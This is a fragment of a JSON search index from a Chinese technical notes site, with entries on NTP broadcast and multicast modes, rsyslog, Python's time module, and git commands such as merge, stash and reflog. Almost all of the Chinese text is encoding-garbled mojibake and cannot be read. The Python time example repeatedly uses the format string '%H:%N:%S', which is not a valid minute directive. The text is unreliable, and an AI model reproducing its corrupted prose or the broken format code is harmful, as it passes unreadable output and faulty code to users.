å¹¿æ’­æ¨¡å¼ åœ¨å¹¿æ’­æ¨¡å¼ä¸­ï¼ŒæœåŠ¡å™¨ç«¯å‘¨æœŸæ€§åœ°å‘å¹¿æ’­åœ°å€255.255.255.255å‘é€æ—¶é’ŸåŒæ­¥æŠ¥æ–‡ï¼ŒæŠ¥æ–‡ä¸­çš„Modeå­—æ®µè®¾ç½®ä¸º5ï¼ˆå¹¿æ’­æ¨¡å¼ï¼‰ã€‚ å®¢æˆ·ç«¯ä¾¦å¬æ¥è‡ªæœåŠ¡å™¨çš„å¹¿æ’­æŠ¥æ–‡ã€‚å½“å®¢æˆ·ç«¯æ¥æ”¶åˆ°ç¬¬ä¸€ä¸ªå¹¿æ’­æŠ¥æ–‡åï¼Œ å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨äº¤äº’Modeå­—æ®µä¸º3ï¼ˆå®¢æˆ·æ¨¡å¼ï¼‰å’Œ4ï¼ˆæœåŠ¡å™¨æ¨¡å¼ï¼‰çš„NTPæŠ¥æ–‡ï¼Œä»¥è·å¾—å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨é—´çš„ç½‘ç»œå»¶è¿Ÿã€‚ ä¹‹åï¼Œå®¢æˆ·ç«¯å°±è¿›å…¥å¹¿æ’­å®¢æˆ·ç«¯æ¨¡å¼ï¼Œç»§ç»­ä¾¦å¬å¹¿æ’­æŠ¥æ–‡çš„åˆ°æ¥ï¼Œæ ¹æ®åˆ°æ¥çš„å¹¿æ’­æŠ¥æ–‡å¯¹ç³»ç»Ÿæ—¶é’Ÿè¿›è¡ŒåŒæ­¥ã€‚ ç»„æ’­æ¨¡å¼ åœ¨ç»„æ’­æ¨¡å¼ä¸­ï¼ŒæœåŠ¡å™¨ç«¯å‘¨æœŸæ€§åœ°å‘ç”¨æˆ·é…ç½®çš„ç»„æ’­åœ°å€ï¼ˆè‹¥ç”¨æˆ·æ²¡æœ‰é…ç½®ç»„æ’­åœ°å€ï¼Œåˆ™ä½¿ç”¨é»˜è®¤çš„NTPç»„æ’­åœ°å€224.0.1.1ï¼‰å‘é€æ—¶é’ŸåŒæ­¥æŠ¥æ–‡ï¼Œ æŠ¥æ–‡ä¸­çš„Modeå­—æ®µè®¾ç½®ä¸º5ï¼ˆç»„æ’­æ¨¡å¼ï¼‰ã€‚å®¢æˆ·ç«¯ä¾¦å¬æ¥è‡ªæœåŠ¡å™¨çš„ç»„æ’­æŠ¥æ–‡ã€‚ å½“å®¢æˆ·ç«¯æ¥æ”¶åˆ°ç¬¬ä¸€ä¸ªç»„æ’­æŠ¥æ–‡åï¼Œå®¢æˆ·ç«¯ä¸æœåŠ¡å™¨äº¤äº’Modeå­—æ®µä¸º3ï¼ˆå®¢æˆ·æ¨¡å¼ï¼‰å’Œ4ï¼ˆæœåŠ¡å™¨æ¨¡å¼ï¼‰çš„NTPæŠ¥æ–‡ï¼Œ ä»¥è·å¾—å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨é—´çš„ç½‘ç»œå»¶è¿Ÿã€‚ä¹‹åï¼Œå®¢æˆ·ç«¯å°±è¿›å…¥ç»„æ’­å®¢æˆ·æ¨¡å¼ï¼Œç»§ç»­ä¾¦å¬ç»„æ’­æŠ¥æ–‡çš„åˆ°æ¥ï¼Œæ ¹æ®åˆ°æ¥çš„ç»„æ’­æŠ¥æ–‡å¯¹ç³»ç»Ÿæ—¶é’Ÿè¿›è¡ŒåŒæ­¥ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-system-service-NTP-service.html","loc":"/yq-doc-source-docs-operating-system-linux-system-service-NTP-service.html"},{"title":"rsyslog","text":"rsyslogæœåŠ¡ rsyslogæ—¥å¿—æœåŠ¡ç®€ä»‹ rsyslogæ˜¯ä¸€ä¸ªåŸºäºC/Sæ¶æ„çš„æœåŠ¡ï¼ŒLinuxç³»ç»Ÿä¸­åˆ†ç±»ä¸¤ä¸ªæ—¥å¿—ï¼š klogdï¼škernelï¼Œè®°å½•å†…æ ¸ç›¸å…³æ—¥å¿— syslogdï¼šserviceï¼Œè®°å½•åº”ç”¨ç¨‹åºç›¸å…³æ—¥å¿— rsyslogæ˜¯centos6 ä»¥åç³»ç»Ÿä½¿ç”¨çš„æ—¥å¿—ç³»ç»Ÿã€‚ è®°å½•æ ¼å¼: æ—¥æœŸæ—¶é—´ ä¸»æœºè¿›ç¨‹[pid]ï¼š äº‹ä»¶å†…å®¹ rsyslogé…ç½®è¯¦è§£ ç¨‹åºåŒ…ï¼šrsyslog é…ç½®æ–‡ä»¶ï¼š/etc/rsyslog.conf /etc/rsyslog.d/ ä¸»ç¨‹åºï¼š/usr/sbin/rsyslogd æ¨¡å—è·¯å¾„ï¼š/usr/lib64/rsyslog/ unit file: /usr/lib/systemd/system/rsyslog.service ç›¸å…³æœ¯è¯­: facilityï¼šè®¾æ–½ã€ä¿¡é“ priorityï¼šæ—¥å¿—çº§åˆ« å‘½ä»¤ä½¿ç”¨ æ—¥å¿—å­˜å‚¨åœ¨mysql","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-system-service-rsyslog.html","loc":"/yq-doc-source-docs-operating-system-linux-system-service-rsyslog.html"},{"title":"time","text":"å®˜ç½‘: https://docs.python.org/zh-cn/3/library/time.html å‚è€ƒ: python timeæ¨¡å— å¸¸ç”¨: strptime #pè¡¨ç¤ºparseï¼Œè¡¨ç¤ºåˆ†æçš„æ„æ€ï¼Œæ‰€ä»¥strptimeæ˜¯ç»™å®šä¸€ä¸ªæ—¶é—´å­—ç¬¦ä¸²å’Œåˆ†ææ¨¡å¼ï¼Œè¿”å›ä¸€ä¸ªæ—¶é—´å¯¹è±¡ã€‚ strftime #fè¡¨ç¤ºformatï¼Œè¡¨ç¤ºæ ¼å¼åŒ–ï¼Œå’Œstrptimeæ­£å¥½ç›¸åï¼Œè¦æ±‚ç»™ä¸€ä¸ªæ—¶é—´å¯¹è±¡å’Œè¾“å‡ºæ ¼å¼ï¼Œè¿”å›ä¸€ä¸ªæ—¶é—´å­—ç¬¦ä¸² #è·å–å½“å‰æ—¶é—´æˆ³ timestamp = int(time.time()) #æ ¼å¼åŒ–æ—¶é—´æˆ³ä¸ºæœ¬åœ°çš„æ—¶é—´å…ƒç»„ timeArray = time.localtime(timestamp) #æ ¼å¼åŒ–æ—¶é—´ä¸ºç›®æ ‡æ ¼å¼å­—ç¬¦ä¸² timeStr = time.strftime('%Y-%m-%d %H:%N:%S', timeArray) #æ ¹æ®æŒ‡å®šçš„æ ¼å¼æŠŠä¸€ä¸ªæ—¶é—´å­—ç¬¦ä¸²è§£æä¸ºæ—¶é—´å…ƒç»„ timeArray2 = time.strptime(timeStr, '%Y-%m-%d %H:%N:%S') #è½¬æ¢ä¸ºæ—¶é—´æˆ³ timestamp2 = int(time.mktime(timeArray2)) æ¦‚è¿° strptime , pè¡¨ç¤ºparseï¼Œè¡¨ç¤ºåˆ†æçš„æ„æ€ï¼Œæ‰€ä»¥strptimeæ˜¯ç»™å®šä¸€ä¸ªæ—¶é—´å­—ç¬¦ä¸²å’Œåˆ†ææ¨¡å¼ï¼Œè¿”å›ä¸€ä¸ªæ—¶é—´å¯¹è±¡ã€‚ strftime , fè¡¨ç¤ºformatï¼Œè¡¨ç¤ºæ ¼å¼åŒ–ï¼Œå’Œstrptimeæ­£å¥½ç›¸åï¼Œè¦æ±‚ç»™ä¸€ä¸ªæ—¶é—´å¯¹è±¡å’Œè¾“å‡ºæ ¼å¼ï¼Œè¿”å›ä¸€ä¸ªæ—¶é—´å­—ç¬¦ä¸² è·å–å½“å‰æ—¶é—´æˆ³: timestamp = int(time.time()) æ ¼å¼åŒ–æ—¶é—´æˆ³ä¸ºæœ¬åœ°çš„æ—¶é—´å…ƒç»„: timeArray = time.localtime(timestamp) æ ¼å¼åŒ–æ—¶é—´ä¸ºç›®æ ‡æ ¼å¼å­—ç¬¦ä¸²: timeStr = time.strftime('%Y-%m-%d %H:%N:%S', timeArray) æ ¹æ®æŒ‡å®šçš„æ ¼å¼æŠŠä¸€ä¸ªæ—¶é—´å­—ç¬¦ä¸²è§£æä¸ºæ—¶é—´å…ƒç»„: timeArray2 = time.strptime(timeStr, '%Y-%m-%d %H:%N:%S') è½¬æ¢ä¸ºæ—¶é—´æˆ³: timestamp2 = int(time.mktime(timeArray2)) è¯´æ˜ åœ¨Pythonä¸­ï¼Œé€šå¸¸æœ‰è¿™å‡ ç§æ–¹å¼æ¥è¡¨ç¤ºæ—¶é—´: æ—¶é—´æˆ³ æ ¼å¼åŒ–çš„æ—¶é—´å­—ç¬¦ä¸² å…ƒç»„ï¼ˆstruct_timeï¼‰, å…±ä¹ä¸ªå…ƒç´ ã€‚ç”±äºPythonçš„timeæ¨¡å—å®ç°ä¸»è¦è°ƒç”¨Cåº“ï¼Œæ‰€ä»¥å„ä¸ªå¹³å°å¯èƒ½æœ‰æ‰€ä¸åŒã€‚ æ—¶é—´è¯´æ˜: UTCï¼ˆCoordinated Universal Timeï¼Œä¸–ç•Œåè°ƒæ—¶ï¼‰äº¦å³æ ¼æ—å¨æ²»å¤©æ–‡æ—¶é—´ï¼Œä¸–ç•Œæ ‡å‡†æ—¶é—´ã€‚ åœ¨ä¸­å›½ä¸ºUTC+8ã€‚DSTï¼ˆDaylight Saving Timeï¼‰å³å¤ä»¤æ—¶ã€‚ æ—¶é—´æˆ³ï¼ˆtimestampï¼‰çš„æ–¹å¼. é€šå¸¸æ¥è¯´ï¼Œæ—¶é—´æˆ³è¡¨ç¤ºçš„æ˜¯ä» 1970å¹´1æœˆ1æ—¥00:00:00 å¼€å§‹æŒ‰ç§’è®¡ç®—çš„åç§»é‡ã€‚ æˆ‘ä»¬è¿è¡Œ type(time.time()) , è¿”å›çš„æ˜¯floatç±»å‹ã€‚ è¿”å›æ—¶é—´æˆ³æ–¹å¼çš„å‡½æ•°ä¸»è¦æœ‰time()ï¼Œclock()ç­‰ã€‚ å…ƒç»„ï¼ˆstruct_timeï¼‰æ–¹å¼. struct_timeå…ƒç»„å…±æœ‰9ä¸ªå…ƒç´ ï¼Œè¿”å› struct_time çš„å‡½æ•°ä¸»è¦æœ‰gmtime()ï¼Œlocaltime()ï¼Œstrptime()ã€‚ ä¸‹é¢åˆ—å‡ºè¿™ç§æ–¹å¼å…ƒç»„ä¸­çš„å‡ ä¸ªå…ƒç´ : ç´¢å¼•(Index) å±æ€§(Attribute) å€¼(Values) 0 tm_yearï¼ˆå¹´ï¼‰ æ¯”å¦‚2011 1 tm_monï¼ˆæœˆï¼‰ 1 - 12 2 tm_mdayï¼ˆæ—¥ï¼‰ 1 - 31 3 tm_hourï¼ˆæ—¶ï¼‰ 0 - 23 4 tm_minï¼ˆåˆ†ï¼‰ 0 - 59 5 tm_secï¼ˆç§’ï¼‰ 0 - 61 6 tm_wday (weekday) 0 - 6 (0è¡¨ç¤ºå‘¨æ—¥) 7 tm_ydayï¼ˆä¸€å¹´ä¸­çš„ç¬¬å‡ å¤©ï¼‰ 1 - 366 8 tm_isdstï¼ˆæ˜¯å¦æ˜¯å¤ä»¤æ—¶ï¼‰ é»˜è®¤ä¸º-1 python æä¾›çš„å‡½æ•°å¤§æ¦‚å¯ä»¥å®Œæˆå¦‚ä¸‹è½¬æ¢: time.ctime([secs]) ---------------------------------------------------------> time.mktime(t) time.strftime(format[, t]) <--------------- -----------------------> =============== =============== ============== | time.time() | | struct_time | | æ—¶é—´å­—ç¬¦ä¸² | | æ—¶é—´æˆ³ | =============== ============== =============== ---------------> <----------------------- time.localtime([secs]) time.strptime(string[, format]) time.gmtime([secs]) time.asctime([t]) ---------------> -----------------------> å°†äº‹ä»¶æˆ³è½¬æ¢ä¸º â€˜Sun Jun 20 23:21:05 1993' UTCæ—¶åŒºï¼ˆ0æ—¶åŒºï¼‰çš„struct_time è½¬æ¢ä¸ºæ­¤ç§å­—ç¬¦ä¸²å½¢å¼ ----------------- | | | time.sleep(s) | | çº¿ç¨‹æš‚åœè¿è¡Œ | | s ç§’ | ----------------- æä¾›çš„å‡½æ•° time.mktime å®ä¾‹: #!/usr/bin/python import time t = (2009, 2, 17, 17, 3, 38, 1, 48, 0) secs = time.mktime( t ) print \"time.mktime(t) : %f\" % secs print \"asctime(localtime(secs)): %s\" % time.asctime(time.localtime(secs)) ç»“æœ: time.mktime(t) : 1234915418.000000 asctime(localtime(secs)): Tue Feb 17 17:03:38 2009 time.time time.localtime ä¾‹: >>> time.localtime() time.struct_time(tm_year=2011, tm_mon=5, tm_mday=5, tm_hour=14, tm_min=14, tm_sec=50, tm_wday=3, tm_yday=125, tm_isdst=0) >>> time.localtime(1304575584.1361799) time.struct_time(tm_year=2011, tm_mon=5, tm_mday=5, tm_hour=14, tm_min=6, tm_sec=24, tm_wday=3, tm_yday=125, tm_isdst=0) time.gmtime ä¾‹: >>>time.gmtime() time.struct_time(tm_year=2011, tm_mon=5, tm_mday=5, tm_hour=6, tm_min=19, tm_sec=48, tm_wday=3, tm_yday=125, tm_isdst=0) time.sleep time.clock time.asctime ä¾‹: >>> time.asctime() 'Thu May 5 14:55:43 2011' time.ctime ä¾‹: >>> time.ctime() 'Thu May 5 14:58:09 2011' >>> time.ctime(time.time()) 'Thu May 5 14:58:39 2011' >>> time.ctime(1304579615) 'Thu May 5 15:13:35 2011' time.strftime å¤‡æ³¨ ï¼š \"%p\"åªæœ‰ä¸\"%I\"é…åˆä½¿ç”¨æ‰æœ‰æ•ˆæœã€‚ æ–‡æ¡£ä¸­å¼ºè°ƒç¡®å®æ˜¯0 - 61ï¼Œè€Œä¸æ˜¯59ï¼Œé—°å¹´ç§’å ä¸¤ç§’ï¼ˆæ±—ä¸€ä¸ªï¼‰ã€‚ å½“ä½¿ç”¨strptime()å‡½æ•°æ—¶ï¼Œåªæœ‰å½“åœ¨è¿™å¹´ä¸­çš„å‘¨æ•°å’Œå¤©æ•°è¢«ç¡®å®šçš„æ—¶å€™%Uå’Œ%Wæ‰ä¼šè¢«è®¡ç®—ã€‚ ä¾‹: >>> time.strftime(\"%Y-%m-%d %X\", time.localtime()) '2011-05-05 16:37:06' time.strptime å…¶ä»– ä»Šå¤©çœ‹æ–‡æ¡£æœ‰ä¸€ä¸ª time.perf_counter(), ä¸time.time() çš„åŒºåˆ«çš„å°±æ˜¯å®ƒä¸ç³»ç»Ÿæ—¶é—´æ— å…³, ä¸” ç²¾åº¦æœ€é«˜","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-time.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-time.html"},{"title":"checkout","text":"git checkout $branch_name åˆ‡æ¢åˆ†æ”¯ git checkout -b $new_branch_name æ–°å»ºåˆ†æ”¯å¹¶åˆ‡æ¢ -b <new_branch> æ–°å»ºå¹¶åˆ‡æ¢åˆ°æ–°çš„åˆ†æ”¯new_branch --theirs <fileName> æ£€å‡ºå¦å¤–åˆ†æ”¯çš„æŒ‡å®šæ–‡ä»¶ --ours <fileName> æ£€å‡ºè‡ªå·±åˆ†æ”¯çš„æŒ‡å®šæ–‡ä»¶ --ourså’Œtheirsä¸€èˆ¬æ˜¯ç”¨äºè§£å†³å†²çªæ—¶å€™ä½¿ç”¨çš„, å¯ä»¥æ³¨æ„åˆ°æœ‰å†²çªæ—¶, å†²çªéƒ¨åˆ†ä¼šè¢«ç®­å¤´åŠ å¤šç­‰å·åŒ…è£¹, ä¸­é—´ä»¥å¤šç­‰å·éš”å¼€, è¿™ä¸ªæ—¶å€™ ourså°±æ˜¯å¤šç­‰å·ä¸Šé¢çš„éƒ¨åˆ† , theirså°±æ˜¯å¤šç­‰å·ä¸‹é¢çš„éƒ¨åˆ† . eg: git checkout --ours <fileName>","tags":"ç‰ˆæœ¬æ§åˆ¶","url":"/yq-doc-source-docs-version-control-git-Command-Checkout.html","loc":"/yq-doc-source-docs-version-control-git-Command-Checkout.html"},{"title":"commit","text":"--amend è§¦å‘ç¼–è¾‘å™¨æ‰“å¼€, å¯ä¿®æ”¹æœ€è¿‘ä¸€æ¬¡çš„æäº¤ä¿¡æ¯ ä¿®æ”¹æœ€æ–°ä¸€æ¬¡æäº¤ä½œè€…ä¿¡æ¯: git commit --amend --author=\"Author Name <email@address.com>\" ç›´æ¥ä¿®æ”¹æœ€è¿‘ä¸€æ¬¡æäº¤çš„æ³¨é‡Šä¿¡æ¯: git commit --amend","tags":"ç‰ˆæœ¬æ§åˆ¶","url":"/yq-doc-source-docs-version-control-git-Command-Commit.html","loc":"/yq-doc-source-docs-version-control-git-Command-Commit.html"},{"title":"diff","text":"æ¯”è¾ƒå·®å¼‚ git diff å‘½ä»¤æ¯”è¾ƒæ–‡ä»¶çš„ä¸åŒï¼Œå³æ¯”è¾ƒæ–‡ä»¶åœ¨æš‚å­˜åŒºå’Œå·¥ä½œåŒºçš„å·®å¼‚ã€‚ git diff å‘½ä»¤æ˜¾ç¤ºå·²å†™å…¥æš‚å­˜åŒºå’Œå·²ç»è¢«ä¿®æ”¹ä½†å°šæœªå†™å…¥æš‚å­˜åŒºæ–‡ä»¶çš„åŒºåˆ«ã€‚ å°šæœªç¼“å­˜çš„æ”¹åŠ¨ï¼šgit diff æŸ¥çœ‹å·²ç¼“å­˜çš„æ”¹åŠ¨ï¼š git diff --cached æŸ¥çœ‹å·²ç¼“å­˜çš„ä¸æœªç¼“å­˜çš„æ‰€æœ‰æ”¹åŠ¨ï¼šgit diff HEAD æ˜¾ç¤ºæ‘˜è¦è€Œéæ•´ä¸ª diffï¼šgit diff --stat æ˜¾ç¤ºæš‚å­˜åŒºå’Œå·¥ä½œåŒºçš„å·®å¼‚: $ git diff [file] æ˜¾ç¤ºæš‚å­˜åŒºå’Œä¸Šä¸€æ¬¡æäº¤(commit)çš„å·®å¼‚: $ git diff --cached [file] æˆ–: $ git diff --staged [file] æ˜¾ç¤ºä¸¤æ¬¡æäº¤ä¹‹é—´çš„å·®å¼‚: $ git diff [first-branch]...[second-branch]","tags":"ç‰ˆæœ¬æ§åˆ¶","url":"/yq-doc-source-docs-version-control-git-Command-DIFF.html","loc":"/yq-doc-source-docs-version-control-git-Command-DIFF.html"},{"title":"log","text":"æŸ¥çœ‹æ—¥å¿— æŸ¥çœ‹fetchæœ€æ–°çš„æ—¥å¿—æ›´æ–°ä¿¡æ¯: # git fetch åä¼šæœ‰ä¸€ä¸ª FETCH_HEAD æŒ‡é’ˆæŒ‡å‘æœ€æ–° git log -p FETCH_HEAD","tags":"ç‰ˆæœ¬æ§åˆ¶","url":"/yq-doc-source-docs-version-control-git-Command-Log.html","loc":"/yq-doc-source-docs-version-control-git-Command-Log.html"},{"title":"merge","text":"åˆå¹¶ä»£ç  åˆå¹¶å…¶ä»–åˆ†æ”¯åˆ°å½“å‰æ‰€åœ¨åˆ†æ”¯: git merge $branch_name åˆå¹¶æ—¶, è‹¥æœ‰å†²çªéœ€è¦æ‰‹åŠ¨å¤„ç†, å¤„ç†å¥½åä½¿ç”¨continueé€‰é¡¹: git merge --continue è‹¥åœ¨è¿‡ç¨‹ä¸­ä¸æƒ³åˆå¹¶, æ”¾å¼ƒæ­¤æ¬¡åˆå¹¶, å›åˆ°åˆå¹¶å‰çš„çŠ¶æ€: git merge --abort æ³¨è§£ åƒ merge, rebase ç­‰éƒ½å¯ä»¥ä½¿ç”¨ continue ä¸ abort æœ‰æ—¶å€™åœ¨è¿œç¨‹æ–°å»ºäº†ä¸€ä¸ªä»“åº“å¹¶æ·»åŠ äº†ä¸€äº›ä¿¡æ¯æ—¶, æ¯”å¦‚ License ä¸”æœ¬åœ°ä¹Ÿæœ‰ä»“åº“æ—¶, è¦å¦‚ä½•åˆå¹¶? git remote add origin git@xxx.git git fetch origin git merge --allow-unrelated-historie origin/master # æˆ‘åªç”¨è¿‡ä¸¤ä¸ªåˆ†æ”¯çš„, è¿™ä¸ªæ˜¯æˆ‘æ¨æµ‹å¯è¡Œçš„è¿˜ä¹ˆæµ‹è¯•è¿‡ å…¶ä»–é€‰é¡¹ --ff fast-forwardæ¨¡å¼, ä¸ä¼šåˆ›é€ ä¸€ä¸ªæ–°çš„commitèŠ‚ç‚¹. é»˜è®¤ä½¿ç”¨æ­¤æ¨¡å¼ --no-ff å³ä½¿å¯ä»¥ä½¿ç”¨fast-forwardæ¨¡å¼ï¼Œä¹Ÿè¦åˆ›å»ºä¸€ä¸ªæ–°çš„åˆå¹¶èŠ‚ç‚¹ã€‚è¿™æ˜¯å½“git mergeåœ¨åˆå¹¶ä¸€ä¸ªtagæ—¶çš„é»˜è®¤è¡Œä¸ºã€‚ --ff-only é™¤éå½“å‰HEADèŠ‚ç‚¹å·²ç»up-to-dateï¼ˆæ›´æ–°æŒ‡å‘åˆ°æœ€æ–°èŠ‚ç‚¹ï¼‰æˆ–è€…èƒ½å¤Ÿä½¿ç”¨fast-forwardæ¨¡å¼è¿›è¡Œåˆå¹¶ï¼Œå¦åˆ™çš„è¯å°†æ‹’ç»åˆå¹¶ï¼Œå¹¶è¿”å›ä¸€ä¸ªå¤±è´¥çŠ¶æ€ --commit åˆå¹¶åè‡ªåŠ¨è°ƒç”¨git commit, å¯ä»¥è¦†ç›–--no-commit --no-commit åˆå¹¶å, ä¸è‡ªåŠ¨commit -m <msg> åˆå¹¶æ—¶å€™çš„è¯´æ˜ä¿¡æ¯ --edit , -e åˆå¹¶åå¼¹å‡ºç¼–è¾‘å™¨æ¥ç¼–è¾‘åˆå¹¶ä¿¡æ¯, å¯åœ¨ -m çš„åŸºç¡€ä¸Šç»§ç»­ç¼–è¾‘ --no-edit ç”¨äºæ¥å—è‡ªåŠ¨åˆå¹¶çš„ä¿¡æ¯ï¼ˆé€šå¸¸æƒ…å†µä¸‹å¹¶ä¸é¼“åŠ±è¿™æ ·åšï¼‰ --log= <n> å°†åœ¨åˆå¹¶æäº¤æ—¶ï¼Œé™¤äº†å«æœ‰åˆ†æ”¯åä»¥å¤–ï¼Œè¿˜å°†å«æœ‰æœ€å¤šnä¸ªè¢«åˆå¹¶commitèŠ‚ç‚¹çš„æ—¥å¿—ä¿¡æ¯, è¿™é‡Œæ²¡å¤§æ‡‚ --no-log å¹¶ä¸ä¼šåˆ—å‡ºè¯¥ä¿¡æ¯ --stat åœ¨åˆå¹¶ç»“æœçš„æœ«ç«¯æ˜¾ç¤ºæ–‡ä»¶å·®å¼‚çš„çŠ¶æ€ã€‚æ–‡ä»¶å·®å¼‚çš„çŠ¶æ€ä¹Ÿå¯ä»¥åœ¨gité…ç½®æ–‡ä»¶ä¸­çš„merge.staté…ç½®ã€‚ -n , --no-stat ä¸ä¼šæ˜¾ç¤ºæ–‡ä»¶å·®å¼‚çš„çŠ¶æ€ --squash å½“ä¸€ä¸ªåˆå¹¶å‘ç”Ÿæ—¶ï¼Œä»å½“å‰åˆ†æ”¯å’Œå¯¹æ–¹åˆ†æ”¯çš„å…±åŒç¥–å…ˆèŠ‚ç‚¹ä¹‹åçš„å¯¹æ–¹åˆ†æ”¯èŠ‚ç‚¹ï¼Œä¸€ç›´åˆ°å¯¹æ–¹åˆ†æ”¯çš„é¡¶éƒ¨èŠ‚ç‚¹å°†ä¼šå‹ç¼©åœ¨ä¸€èµ·, ä¸ --no-ff å†²çª --verify-signatures ç”¨äºéªŒè¯è¢«åˆå¹¶çš„èŠ‚ç‚¹æ˜¯å¦å¸¦æœ‰GPGç­¾åï¼Œå¹¶åœ¨åˆå¹¶ä¸­å¿½ç•¥é‚£äº›ä¸å¸¦æœ‰GPGç­¾åéªŒè¯çš„èŠ‚ç‚¹ --no-verify-signatures ä¸éªŒè¯GPGç­¾å --allow-unrelated-historie å½“éœ€è¦åˆå¹¶çš„ä¸¤ä¸ªåˆ†æ”¯å†å²çº¿æ²¡æœ‰äº¤ç‚¹æ—¶, ä½¿ç”¨æ­¤æŒ‡ä»¤å¿½ç•¥æ— äº¤ç‚¹ æ­¤å¤„å‚è€ƒ:: git-mergeå®Œå…¨è§£æ","tags":"ç‰ˆæœ¬æ§åˆ¶","url":"/yq-doc-source-docs-version-control-git-Command-Merge.html","loc":"/yq-doc-source-docs-version-control-git-Command-Merge.html"},{"title":"reflog","text":"reflog(Reference logs), å‚è€ƒæ—¥å¿— æŸ¥çœ‹æœ¬åœ°gitå˜æ›´å†å², æ–¹ä¾¿å›æ»š, ä¸ log çš„ åŒºåˆ«æ˜¯ log æ˜¯å‘çˆ¶çº§æäº¤é€’å½’å¯»æ‰¾, reflogè®°å½•æ‰€æœ‰å˜æ›´ reflogä»…ä¿å­˜åœ¨æœ¬åœ°, è®°å½•çš„å˜æ›´åŒ…æ‹¬äº†rebase, resetç­‰ ä¸€èˆ¬ä½¿ç”¨, æŸ¥çœ‹reflogå†å²: # ä¼šçœ‹åˆ°æœ‰ HEAD@ çš„è®°å½• git reflog æ ¹æ®è®°å½•åˆ¤æ–­éœ€è¦å›æ»šçš„æ˜¯å“ªä¸€ä¸ªHEAD(è¿˜å¯ä»¥é€šè¿‡git showæŸ¥çœ‹æŸHEADçš„æäº¤æ—¥å¿—è¾…åŠ©åˆ¤æ–­), ç„¶åresetå›æ»š: # å¦‚æœæ˜¯ HEAD@{9} git reset --hard HEAD@{9}","tags":"ç‰ˆæœ¬æ§åˆ¶","url":"/yq-doc-source-docs-version-control-git-Command-Reflog.html","loc":"/yq-doc-source-docs-version-control-git-Command-Reflog.html"},{"title":"stash","text":"æš‚å­˜ å½“åˆ‡æ¢åˆ†æ”¯çš„æ—¶å€™, æœ‰æ—¶ä¼šæç¤ºéœ€è¦å…ˆæäº¤æœ¬åœ°çš„ä¿®æ”¹, ä½†æœ‰æ—¶æˆ‘å¹¶ä¸æƒ³æäº¤, è¿™æ—¶å¯ä»¥é€‰æ‹©æš‚å­˜å½“å‰ä¿®æ”¹ æ³¨: æ”¯æŒåœ¨ä¸åŒåˆ†æ”¯ä¹‹é—´æ“ä½œ æš‚å­˜ æš‚å­˜ä¿®æ”¹åˆ°æœ¬åœ°å †æ ˆ, é»˜è®¤å­˜æ‰€æœ‰ä¿®æ”¹å†…å®¹: git stash # é€‰é¡¹ # --keep-index åªæš‚å­˜æ²¡æœ‰addçš„å†…å®¹ # -uæˆ–--include-untracked stashæ—¶å€™åŠ å…¥æœªåŠ å…¥gitçš„å†…å®¹ å…¶ä»–å‘½ä»¤, ä»å­˜å‚¨æ–°å»ºä¸€ä¸ªåˆ†æ”¯: git stash branch $new_branch æ¢å¤ æ–¹å¼ä¸€, ä»å †æ ˆæ¢å¤, ä½¿ç”¨æ ˆé¡¶è®°å½•å¹¶è‡ªåŠ¨ä»å †æ ˆåˆ é™¤æ­¤æ¡è®°å½•: git stash pop æ–¹å¼äºŒ, ä»å †æ ˆæ¢å¤, ä½†ä¸åˆ é™¤å †æ ˆè®°å½•: git stash list # æŸ¥çœ‹å­˜åœ¨æœ‰å“ªäº›å †æ ˆè®°å½• è¾“å‡ºä¸€èˆ¬ä¸º stash@{0} è¿™ç§, 0 è¡¨ç¤ºæœ€æ–°ä¸€ä¸ª git stash apply # å¯ä»¥åŠ å‚æ•° stash@{0} è¡¨ç¤ºæ¢å¤å“ªæ¬¡è®°å½•, é»˜è®¤ä¸è®°å½•æš‚å­˜åŒºè®°å½•(å³addçš„å†…å®¹) # ä½¿ç”¨ git stash drop stash@{0} åˆ é™¤è®°å½• # --index å‚æ•°æ”¯æŒæ¢å¤æ—¶, æ¢å¤æ–°æ–‡ä»¶æš‚å­˜åŒºçŠ¶æ€(addçš„çŠ¶æ€, )","tags":"ç‰ˆæœ¬æ§åˆ¶","url":"/yq-doc-source-docs-version-control-git-Command-Stash.html","loc":"/yq-doc-source-docs-version-control-git-Command-Stash.html"},{"title":"blame","text":"ç”¨æ¥è¿½æº¯ä¸€ä¸ªæŒ‡å®šæ–‡ä»¶çš„å†å²ä¿®æ”¹è®°å½•, èƒ½æ˜¾ç¤ºä»»ä½•æ–‡ä»¶ä¸­æ¯è¡Œæœ€åä¸€æ¬¡ä¿®æ”¹çš„æäº¤è®°å½• ç”¨æ³•: git blame filename ä½¿ç”¨ -L æŒ‡å®šæ–‡ä»¶çš„è¡Œæ•°èŒƒå›´: git blame -L n1,n2 filename æ˜¾ç¤ºæ ¼å¼: commit ID (ä»£ç æäº¤ä½œè€… æäº¤æ—¶é—´ ä»£ç ä½äºæ–‡ä»¶ä¸­çš„è¡Œæ•°) å®é™…ä»£ç ","tags":"ç‰ˆæœ¬æ§åˆ¶","url":"/yq-doc-source-docs-version-control-git-Command-blame.html","loc":"/yq-doc-source-docs-version-control-git-Command-blame.html"},{"title":"branch","text":"é»˜è®¤æŸ¥çœ‹æœ¬åœ°æ‰€æœ‰åˆ†æ”¯ é€‰é¡¹å‚æ•°: branch options -a, --all list both remote-tracking and local branches -r, --remote æŸ¥çœ‹è¿œç¨‹æ‰€æœ‰åˆ†æ”¯ -d, --delete delete fully merged branch -D delete branch (even if not merged) -m, --move move/rename a branch and its reflog -M move/rename a branch, even if target exists -c, --copy copy a branch and its reflog -C copy a branch, even if target exists -l, --list list branch names --show-current show current branch name --create-reflog create the branch's reflog --edit-description edit the description for the branch -f, --force force creation, move/rename, deletion --merged <commit> print only branches that are merged --no-merged <commit> print only branches that are not merged --column[=<style>] list branches in columns --sort <key> field name to sort on --points-at <object> print only branches of the object -i, --ignore-case sorting and filtering are case insensitive --recurse-submodules recurse through submodules --format <format> format to use for the output","tags":"ç‰ˆæœ¬æ§åˆ¶","url":"/yq-doc-source-docs-version-control-git-Command-branch.html","loc":"/yq-doc-source-docs-version-control-git-Command-branch.html"},{"title":"config","text":"æ ¼å¼: git config [â€“local|â€“global|â€“system] -l æŸ¥çœ‹ä»“åº“çº§çš„config: git config â€“local -l 